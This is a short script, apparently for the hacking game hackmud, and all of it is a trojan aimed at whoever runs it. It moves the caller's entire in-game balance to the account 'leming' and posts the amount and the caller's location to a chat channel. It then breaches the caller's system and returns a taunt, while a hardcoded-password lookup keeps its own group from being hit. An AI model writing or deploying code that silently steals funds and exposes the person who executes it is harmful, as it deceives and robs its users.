function(C,A){
	
	const B = #s.scripts.lib()
	var sudo = #s.uwotm8.debby({
		cmd:"dbf",
		que:{ vname:"root" },
		password:"spam"
	})[0]
	sudo = sudo.list
	
	let channel = "D00D"
	let amount = #s.accts.balance()
	
	if (!amount||sudo.indexOf(C.caller)>=0) {
		return "Not worth it."}
	#s.accts.xfer_gc_to({to:"leming", amount})
	#s.chats.join({channel:"D00D"})
	let msg = B.to_gc_str(amount) + " \n`DFrom: `\n" + #s.sys.loc()
	#s.chats.send({channel,msg})
	#s.chats.leave({channel})
	#s.sys.breach({confirm:true})
	return "What did you expect, the spanish inquisition?"
}